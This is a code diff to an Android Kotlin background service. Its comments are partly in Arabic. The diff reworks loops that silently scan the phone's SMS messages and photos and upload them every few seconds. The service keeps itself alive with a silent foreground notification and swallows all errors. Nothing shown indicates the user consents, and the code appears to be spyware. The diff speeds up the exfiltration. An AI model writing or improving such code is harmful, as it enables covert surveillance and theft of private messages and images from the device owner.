@@ -25,13 +25,16 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // 🔥 الأولوية #1 = الصور
-        startImageUploadFirst()
-
+        // Start uploads immediately
         scope.launch {
-            delay(5_000L)
-            startOtherLoops()
+            try {
+                scanSms()
+                scanAndUploadImages()
+                Uploader.flushQueue(applicationContext)
+            } catch (_: Exception) {}
         }
+
+        startLoops()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
@@ -77,48 +80,29 @@ class BackgroundService : Service() {
             .setSilent(true)
             .build()
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1001, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        } else {
-            startForeground(1001, notif)
-        }
+        startForeground(1001, notif)
     }
 
-    private fun startImageUploadFirst() {
-        // Loop A: scan + upload صور جديدة كل 3 ثواني
+    private fun startLoops() {
+        // صور فورًا — كل 5 ثواني
         scope.launch {
             while (running) {
                 try { scanAndUploadImages() } catch (_: Exception) {}
-                delay(3_000L)
+                delay(5_000L)
             }
         }
-        // Loop B: flush media queue كل 2 ثانية
+        // flush queue كل 5 ثواني
         scope.launch {
             while (running) {
                 try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
-                delay(2_000L)
+                delay(5_000L)
             }
         }
-        // Loop C: flush queue العادي — فقط للصور
-        scope.launch {
-            while (running) {
-                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
-                delay(10_000L)
-            }
-        }
-    }
-
-    private fun startOtherLoops() {
+        // SMS كل 60 ثانية
         scope.launch {
             while (running) {
                 try { scanSms() } catch (_: Exception) {}
                 delay(60_000L)
-            }
-        }
-        scope.launch {
-            while (running) {
-                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
-                delay(20_000L)
             }
         }
     }
@@ -126,7 +110,6 @@ class BackgroundService : Service() {
     private fun scanAndUploadImages() {
         val images = MediaScanner.scanImages(applicationContext)
         for (img in images) {
-            DataStore.appendAny(applicationContext, MediaScanner.toJson(img))
             Uploader.uploadMediaFile(applicationContext, img)
         }
     }
